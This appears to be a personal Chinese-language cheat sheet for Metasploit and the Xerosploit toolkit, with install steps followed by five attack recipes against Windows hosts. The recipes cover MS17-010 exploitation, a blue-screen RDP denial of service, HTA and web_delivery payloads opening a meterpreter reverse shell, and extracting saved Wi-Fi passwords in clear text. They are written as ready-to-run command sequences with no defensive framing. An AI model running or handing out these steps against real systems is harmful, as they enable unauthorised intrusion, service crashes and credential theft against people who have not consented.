msf打开方式

    直接在终端输入msfconsole
    进入msf的目录/usr/share/metasploit-framework，运行命令./msfconsole

更新

kali1在目录内运行命令./msfupdate
kali2 运行命令apt update,apt install metasploit-framework


Install Xerosploit:

工具依赖组件

nmap
hping3
build-essential
ruby-dev
libpcap-dev
libgmp3-dev
tabulate
terminaltables

工具功能

端口扫描
网络映射
DoS攻击
HTML代码注入
JavaScript代码注入
下载拦截和替换
嗅探攻击
DNS欺骗
图片替换
Drifnet
Web页面篡改

工具安装

首先，使用git命令将Xerosploit项目源码克隆到本地：

$ git clone https://github.com/LionSec/xerosploit.git

接下来，用sudo命令运行安装脚本install.py：

$ sudo python install.py


------------------------------------------------------------------------------------------
1 How to exploit Windows Vista only by victim's using Kali Linux 2018.3(Tutorial)
   (smb_ms17_010)
# msfconsole
# nmap ip 1/24 扫描  / xerosploit扫描
#msf> use auxiliary/scanner/smb/smb_ms17_010
#msf> set RHOSTS (remote ip)
#msf> run
#msf> use exploit/windows/smb/ms17_010_psexec
#msf> set RHOSTS (remote ip)
#msf>  exploit
------------------------------------------------------------------------------------------
2. How to crash windows xp(blue screen) with metasploit using kali linux 2 (Tutorial)

# msfconsole
#msf> use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
#msf> set rhost (remote ip)
#msf> exploit  
(失败!)
------------------------------------------------------------------------------------------
3. How to exploit windows with HTA server using kali linux 2 (Tutorial)
#msfconsole
#msf> use windows/misc/hta_server/
#msf> set srvhost (local ip)
#msf> set uripath /
#msf> exploit
打开网页下载打开后.
#msf> sessions -i 1
------------------------------------------------------------------------------------------
4. How to exploit windows with web delivery using kali linux 2 (Tutorial)
#msfconsole
#msf> use exploit/multi/script/web_delivery
#msf> set lhost (local ip)
#msf> set lport (local port)
#msf> set uripath /
#msf> show targets
#msf> set target 2   (2 -> PSH)
#msf> set payload windows/meterpreter/reverse_tcp
#msf> exploit
(失败!)
------------------------------------------------------------------------------------------
5 How to get Windows Wi-Fi saved passwords using Metasploit and Kali Linux 2018.4 (Tutorial)
前提: 获取windows shell
#msf> shell
cmd> netsh wlan show profile
cmd> netsh wlan show profile [wifi_name] key=clear
------------------------------------------------------------------------------------------








